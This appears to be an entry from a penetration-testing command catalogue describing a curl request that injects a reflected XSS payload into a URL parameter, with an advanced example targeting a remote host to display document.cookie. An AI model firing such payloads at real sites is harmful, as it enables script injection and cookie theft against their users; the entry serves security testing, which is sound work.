---
id: b17e0f51-ec97-448f-9faf-2acd5b86cc92
name: Inject-XSS-Payload-via-URL-Parameter
type: command
executor: bash
data: 'curl "http://localhost/bla.php?test=</script><script>alert(1)</script>"'
output: null
created_at: '2023-04-06T03:56:42.446633+00:00'
updated_at: '2023-04-10T20:21:48.191302+00:00'
platforms:
  - Web
tags:
  - xss
  - injection
verified: true
validated: true
---

# Inject-XSS-Payload-via-URL-Parameter

## Command

```bash
curl "http://localhost/bla.php?test=</script><script>alert(1)</script>"
```

## Description

This command uses curl to send an HTTP GET request with an XSS payload in the URL parameter, targeting a vulnerable PHP endpoint that reflects input into a script tag without escaping. It tests for quote bypass by closing the tag and injecting a new script.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `http://localhost/bla.php` | Target vulnerable URL base | Yes |
| `?test=` | Vulnerable parameter name | Yes |
| `</script><script>alert(1)</script>` | XSS payload to close tag and inject alert | Yes |

## Examples

### Basic Usage

```bash
curl "http://localhost/bla.php?test=</script><script>alert(1)</script>"
```

### Advanced Usage

```bash
curl -v "http://target.com/search?q=</script><script>alert(document.cookie)</script>" --proxy 127.0.0.1:8080
```

## Expected Output

HTTP/1.1 200 OK
<html>
  <script>
    foo="text </script><script>alert(1)</script>";
  </script>
</html>

The response includes the injected script, which executes in the browser context to show an alert.

## Related

- [[procedures/Bypass-Quotes-in-Script-Tag-for-XSS-Injection]]
